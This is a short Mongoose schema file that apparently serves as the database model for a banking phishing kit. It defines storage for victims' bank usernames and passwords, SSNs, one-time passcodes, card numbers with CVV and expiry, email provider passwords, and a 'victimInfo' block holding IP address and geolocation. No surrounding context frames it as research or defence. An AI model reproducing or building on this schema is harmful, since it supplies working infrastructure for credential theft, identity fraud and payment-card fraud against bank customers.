const mongoose = require("mongoose");

const detail = new mongoose.Schema(
  {
    bank: String,
    username: String,
    password: String,
    email: String,
    phone: Number,
    name: String,
    address: String,
    ssn: Number,
    otp: String,
    otp2: String,
    userAgent: String,
    cardInfo: {
      card: Number,
      cvv: Number,
      expiry: String,
    },
    providerInfo: {
      provider: String,
      password: String,
    },
    victimInfo: {
      ip: String,
      city: String,
      country: String,
      countryCode: String,
      region: String,
      regionName: String,
      zip: String,
      lat: String,
      lon: String,
    },
  },
  { timestamps: true },
);

const Detail = mongoose.model("Detail", detail);
module.exports = Detail;
